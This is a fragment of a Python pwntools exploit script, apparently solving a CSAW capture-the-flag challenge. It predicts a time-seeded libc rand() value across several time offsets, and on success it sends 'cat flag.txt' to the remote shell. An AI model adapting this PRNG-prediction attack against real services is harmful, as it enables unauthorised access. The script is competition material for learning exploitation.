    libc.srand(seed)
    return libc.rand() % 0x100000

context.log_level = 'error'

for offset in range(-3, 4):
    try:
        p = remote("pwn.chal.csaw.io", 5000, timeout=10)
        p.recvuntil(b"check?\n", timeout=10)
        base = int(time.time()) + offset
        found = False
        for i in range(3):
            guess = needle(base + i)
            p.sendline(str(guess).encode())
            resp = p.recvuntil(b"check?\n", timeout=5)
            if b"0x00001337" in resp:
                print("FOUND needle at offset", offset, "guess", guess)
                p.sendline(b"cat flag.txt")
                print(p.recvall(timeout=5).decode(errors='replace'))
                found = True
                break
        p.close()
        if found:
            break
    except Exception as e:
        print("err", offset, e)
